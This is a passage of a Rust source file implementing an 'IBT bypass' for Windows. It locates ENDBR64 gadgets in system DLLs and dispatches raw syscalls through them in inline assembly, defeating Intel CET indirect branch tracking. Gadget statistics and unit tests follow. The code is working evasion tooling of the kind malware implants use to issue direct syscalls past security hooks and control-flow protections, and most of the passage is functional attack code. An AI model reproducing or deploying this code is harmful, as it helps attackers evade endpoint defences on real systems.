        "pop r15",
        "pop r14",
        "pop rbx",

        api        = in(reg) api_addr,
        gadget     = in(reg) effective_gadget,
        ibt_gadget = in(reg) ibt_gadget,
        nstack     = in(reg) nstack,
        stack_ptr  = in(reg) stack_ptr,
        a1         = in(reg) arg1,
        a2         = in(reg) arg2,
        a3         = in(reg) arg3,
        a4         = in(reg) arg4,
        lateout("rax") status,
        out("rcx") _, out("rdx") _,
        out("r8")  _, out("r9")  _, out("r10") _, out("r11") _,
        out("r14") _, out("r15") _,
        out("rsi") _, out("rdi") _,
    );

    Ok(status)
}

/// IBT-safe syscall dispatch.
///
/// Finds an IBT-valid gadget: `ENDBR64; ...; syscall; ...; ret`
/// and dispatches the syscall through it.  The gadget must have `ENDBR64`
/// at its entry so the indirect branch check passes, and must contain
/// `syscall` within its reachable operations.
///
/// The `call` instruction pushes our return address; the gadget's `ret`
/// (after `syscall`) pops it, giving us a clean continuation.
pub unsafe fn ibt_safe_syscall(ssn: u32, args: &[u64]) -> IbtResult<u64> {
    let db = GADGET_DB.get().ok_or(IbtError::NotInitialized)?;

    if db.syscall_gadgets.is_empty() {
        return Err(IbtError::NoGadgetsFound);
    }

    // Pick the first syscall gadget.
    let gadget_addr = db.syscall_gadgets[0].addr;

    // Windows x64 syscall convention:
    //   EAX = syscall number
    //   R10 = 1st argument (RCX is clobbered by syscall for return address)
    //   RDX = 2nd argument
    //   R8  = 3rd argument
    //   R9  = 4th argument
    //   [rsp+0x20] = 5th argument, [rsp+0x28] = 6th, etc.
    let a0 = args.get(0).copied().unwrap_or(0);
    let a1 = args.get(1).copied().unwrap_or(0);
    let a2 = args.get(2).copied().unwrap_or(0);
    let a3 = args.get(3).copied().unwrap_or(0);
    let a4 = args.get(4).copied().unwrap_or(0);

    // Extra stack arguments (beyond the 5th).
    let extra_args: Vec<u64> = args.iter().skip(5).copied().collect();
    let n_extra = extra_args.len();
    let extra_ptr = extra_args.as_ptr();

    let ret: u64;

    std::arch::asm!(
        // ── Prologue: save callee-saved registers ──
        "push rbx",
        "push rbp",
        "push rsi",
        "push rdi",
        "push r14",
        "push r15",
        "mov rbp, rsp",

        // ── Allocate aligned stack frame ──
        // Shadow space (0x20) + room for extra stack args + alignment
        "mov r14, {n_extra}",
        "shl r14, 3",
        "add r14, 0x28 + 15",
        "and r14, -16",
        "sub rsp, r14",

        // ── Copy extra args to [rsp+0x28..] ──
        "test {n_extra}, {n_extra}",
        "jz 4f",
        "mov rcx, {n_extra}",
        "mov rsi, {extra_ptr}",
        "lea rdi, [rsp + 0x28]",
        "cld",
        "rep movsq",
        "4:",

        // ── Load syscall registers (Windows x64 syscall ABI) ──
        "mov eax, {ssn:e}",     // syscall number
        "mov r10, {a0}",        // 1st arg (R10 because syscall clobbers RCX)
        "mov rdx, {a1}",        // 2nd arg
        "mov r8,  {a2}",        // 3rd arg
        "mov r9,  {a3}",        // 4th arg
        // 5th arg → [rsp+0x20]
        "mov rbx, {a4}",
        "mov [rsp + 0x20], rbx",

        // ── Call the gadget ──
        // `call` pushes return address; gadget starts with ENDBR64 → IBT passes.
        // Gadget flow: ENDBR64 → ... → syscall → ... → ret → back here.
        "call {gadget}",

        // ── Epilogue: restore and return ──
        "5:",
        "mov rsp, rbp",
        "pop r15",
        "pop r14",
        "pop rdi",
        "pop rsi",
        "pop rbp",
        "pop rbx",

        ssn       = in(reg) ssn,
        a0        = in(reg) a0,
        a1        = in(reg) a1,
        a2        = in(reg) a2,
        a3        = in(reg) a3,
        a4        = in(reg) a4,
        n_extra   = in(reg) n_extra,
        extra_ptr = in(reg) extra_ptr,
        gadget    = in(reg) gadget_addr,
        out("rax") ret,
        out("rcx") _, out("rdx") _,
        out("r8") _, out("r9") _, out("r10") _,
        out("r11") _, out("r14") _, out("r15") _,
        out("rsi") _, out("rdi") _,
    );

    Ok(ret)
}

/// Check whether IBT is currently active on this process.
///
/// This combines CPU support check with runtime IBT state.  Unlike shadow
/// stacks (which can be queried via RDSSPQ), IBT state is not directly
/// readable from user mode — we rely on the CPUID support check and
/// process mitigation policy.
///
/// Returns `true` if:
/// 1. CPU supports CET IBT (CPUID.07H:EDX[20] = 1)
/// 2. IBT gadgets were successfully found (indicating the system DLLs
///    are compiled with CET, which strongly suggests IBT is active)
pub fn is_ibt_active() -> bool {
    // If we found usable gadgets, IBT is likely active.
    // (If IBT were not active, there would be no ENDBR64 instructions.)
    IBT_AVAILABLE.load(Ordering::Acquire)
}

// ─── Statistics ────────────────────────────────────────────────────────────

/// Statistics about the IBT bypass subsystem.
#[derive(Debug)]
pub struct IbtBypassStats {
    /// Whether the CPU supports CET IBT.
    pub cpu_supports_ibt: bool,
    /// Whether the IBT bypass has been initialized.
    pub initialized: bool,
    /// Whether IBT bypass is available (gadgets found).
    pub bypass_available: bool,
    /// Total number of ENDBR64 gadgets found.
    pub total_gadgets: usize,
    /// Number of `ENDBR64; jmp rax` gadgets.
    pub jmp_rax_count: usize,
    /// Number of `ENDBR64; jmp r11` gadgets.
    pub jmp_r11_count: usize,
    /// Number of `ENDBR64; call rax` gadgets.
    pub call_rax_count: usize,
    /// Number of `ENDBR64; ret` gadgets.
    pub ret_count: usize,
    /// Number of `ENDBR64; syscall` gadgets.
    pub syscall_count: usize,
}

/// Get statistics about the IBT bypass subsystem.
pub fn get_stats() -> IbtBypassStats {
    let db = GADGET_DB.get();
    IbtBypassStats {
        cpu_supports_ibt: cpuid_ibt_supported(),
        initialized: IBT_INITIALIZED.load(Ordering::Acquire),
        bypass_available: IBT_AVAILABLE.load(Ordering::Acquire),
        total_gadgets: db.map_or(0, |d| d.all_gadgets.len()),
        jmp_rax_count: db.map_or(0, |d| d.jmp_rax.len()),
        jmp_r11_count: db.map_or(0, |d| d.jmp_r11.len()),
        call_rax_count: db.map_or(0, |d| d.call_rax.len()),
        ret_count: db.map_or(0, |d| d.ret_gadgets.len()),
        syscall_count: db.map_or(0, |d| d.syscall_gadgets.len()),
    }
}

// ─── Tests ────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_endbr64_encoding() {
        assert_eq!(ENDBR64, [0xF3, 0x0F, 0x1E, 0xFA]);
    }

    #[test]
    fn test_endbr_category_display() {
        assert_eq!(format!("{}", EndbrCategory::FunctionEntry), "FunctionEntry");
        assert_eq!(format!("{}", EndbrCategory::MidFunction), "MidFunction");
        assert_eq!(format!("{}", EndbrCategory::AfterNop), "AfterNop");
        assert_eq!(
            format!("{}", EndbrCategory::ExceptionEntry),
            "ExceptionEntry"
        );
    }

    #[test]
    fn test_gadget_op_display() {
        assert_eq!(format!("{}", GadgetOp::JmpReg(0)), "JmpReg(rax)");
        assert_eq!(format!("{}", GadgetOp::JmpReg(11)), "JmpReg(r11)");
        assert_eq!(format!("{}", GadgetOp::CallReg(0)), "CallReg(rax)");
        assert_eq!(format!("{}", GadgetOp::Ret), "Ret");
        assert_eq!(format!("{}", GadgetOp::Syscall), "Syscall");
        assert_eq!(format!("{}", GadgetOp::Nop), "Nop");
    }

    #[test]
    fn test_reg_name() {
        assert_eq!(reg_name(0), "rax");
        assert_eq!(reg_name(3), "rbx");
        assert_eq!(reg_name(11), "r11");
        assert_eq!(reg_name(15), "r15");
        assert_eq!(reg_name(16), "???");
    }

    #[test]
    fn test_decode_gadget_ops_jmp_rax() {
        // FF E0 = jmp rax
        let bytes = [0xFF, 0xE0];
        let ops = decode_gadget_ops(&bytes);
        assert_eq!(ops, vec![GadgetOp::JmpReg(0)]);
    }

    #[test]
    fn test_decode_gadget_ops_jmp_r11() {
        // 41 FF E3 = jmp r11 (REX.B + FF /4 rbx=3+8=11)
        let bytes = [0x41, 0xFF, 0xE3];
        let ops = decode_gadget_ops(&bytes);
        assert_eq!(ops, vec![GadgetOp::JmpReg(11)]);
    }

    #[test]
    fn test_decode_gadget_ops_call_rax() {
        // FF D0 = call rax
        let bytes = [0xFF, 0xD0];
        let ops = decode_gadget_ops(&bytes);
        assert_eq!(ops, vec![GadgetOp::CallReg(0)]);
    }

    #[test]
    fn test_decode_gadget_ops_ret() {
        let bytes = [0xC3];
        let ops = decode_gadget_ops(&bytes);
        assert_eq!(ops, vec![GadgetOp::Ret]);
    }

    #[test]
    fn test_decode_gadget_ops_ret_imm16() {
        let bytes = [0xC2, 0x08, 0x00]; // ret 8
        let ops = decode_gadget_ops(&bytes);
        assert_eq!(ops, vec![GadgetOp::Ret]);
    }

    #[test]
    fn test_decode_gadget_ops_syscall() {
        let bytes = [0x0F, 0x05];
        let ops = decode_gadget_ops(&bytes);
        assert_eq!(ops, vec![GadgetOp::Syscall]);
    }

    #[test]
    fn test_decode_gadget_ops_nop() {
        let bytes = [0x90];
        let ops = decode_gadget_ops(&bytes);
        assert_eq!(ops, vec![GadgetOp::Nop]);
    }

    #[test]
    fn test_decode_gadget_ops_empty() {
        let bytes: [u8; 0] = [];
        let ops = decode_gadget_ops(&bytes);
        assert!(ops.is_empty());
    }

    #[test]
    fn test_decode_gadget_ops_unknown_stops() {
        // 0x48 is REX.W prefix — decoder should stop at unknown instr.
        let bytes = [0x48, 0x89, 0x1C]; // mov [rsp+...], rbx (incomplete)
        let ops = decode_gadget_ops(&bytes);
        // 0x48 is REX (0x40-0x4F), then 0x89 is not a recognized pattern.
        // The decoder stops on unknown instructions.
        assert!(ops.is_empty());
    }

    #[test]
    fn test_decode_gadget_ops_jmp_rcx() {
        // FF E1 = jmp rcx
        let bytes = [0xFF, 0xE1];
        let ops = decode_gadget_ops(&bytes);
        assert_eq!(ops, vec![GadgetOp::JmpReg(1)]);
    }

    #[test]
    fn test_decode_gadget_ops_jmp_rdx() {
        // FF E2 = jmp rdx
        let bytes = [0xFF, 0xE2];
        let ops = decode_gadget_ops(&bytes);
        assert_eq!(ops, vec![GadgetOp::JmpReg(2)]);
    }

    #[test]
    fn test_decode_gadget_ops_sequence() {
        // ENDBR64 (F3 0F 1E FA) + NOP (90) + JMP RAX (FF E0)
        // Decoder only gets the post-ENDOR bytes.
        let bytes = [0x90, 0xFF, 0xE0];
        let ops = decode_gadget_ops(&bytes);
        assert_eq!(ops, vec![GadgetOp::Nop, GadgetOp::JmpReg(0)]);
    }

    #[test]
    fn test_ibt_error_display() {
        assert_eq!(
            format!("{}", IbtError::NotSupported),
            "IBT not supported by CPU"
        );
        assert_eq!(format!("{}", IbtError::NotEnabled), "IBT not enabled");
        assert_eq!(
            format!("{}", IbtError::NoGadgetsFound),
            "no suitable ENDBR64 gadgets found"
        );
        assert_eq!(
            format!("{}", IbtError::ModuleNotFound("test.dll".to_string())),
            "module not found: test.dll"
        );
        assert_eq!(
            format!("{}", IbtError::ScanFailed("bad pe".to_string())),
            "scan failed: bad pe"
        );
        assert_eq!(
            format!("{}", IbtError::NotInitialized),
            "IBT bypass not initialized"
        );
        assert_eq!(
            format!("{}", IbtError::DatabaseEmpty),
            "gadget database is empty"
        );
    }

    #[test]
    fn test_ibt_error_equality() {
        assert_eq!(IbtError::NotSupported, IbtError::NotSupported);
        assert_ne!(IbtError::NotSupported, IbtError::NotEnabled);
        assert_eq!(
            IbtError::ModuleNotFound("a".to_string()),
            IbtError::ModuleNotFound("a".to_string())
        );
    }

    #[test]
    fn test_ibt_error_is_error() {
        let err = IbtError::NotSupported;
        let _: &dyn std::error::Error = &err;
    }

    #[test]
    fn test_gadget_db_default() {
        let db = IbtGadgetDb::default();
        assert!(db.jmp_rax.is_empty());
        assert!(db.jmp_r11.is_empty());
        assert!(db.call_rax.is_empty());
        assert!(db.ret_gadgets.is_empty());
        assert!(db.syscall_gadgets.is_empty());
        assert!(db.all_gadgets.is_empty());
    }

    #[test]
    fn test_endbr_gadget_fields() {
        let g = EndbrGadget {
            addr: 0x1000,
            category: EndbrCategory::FunctionEntry,
            next_instr: vec![0xFF, 0xE0],
            reachable_ops: vec![GadgetOp::JmpReg(0)],
        };
        assert_eq!(g.addr, 0x1000);
        assert_eq!(g.category, EndbrCategory::FunctionEntry);
        assert_eq!(g.next_instr, vec![0xFF, 0xE0]);
        assert_eq!(g.reachable_ops, vec![GadgetOp::JmpReg(0)]);
    }

    #[test]
    fn test_cpuid_ibt_supported() {
        // Just verify the function runs without panicking.
        let _ = cpuid_ibt_supported();
    }

    #[test]
    fn test_init_ibt_bypass_idempotent() {
        let _ = init_ibt_bypass();
        let _ = init_ibt_bypass();
    }

    #[test]
    fn test_constants() {
        assert_eq!(CPUID_IBT_BIT, 20);
        assert_eq!(ENDBR64, [0xF3, 0x0F, 0x1E, 0xFA]);
        assert_eq!(GADGET_ANALYSIS_LEN, 64);
        assert_eq!(MAX_GADGETS_PER_MODULE, 4096);
    }

    #[test]
    fn test_get_stats_before_init() {
        let stats = get_stats();
        // Before init, should show not initialized.
        assert!(!stats.initialized || stats.cpu_supports_ibt);
    }
}
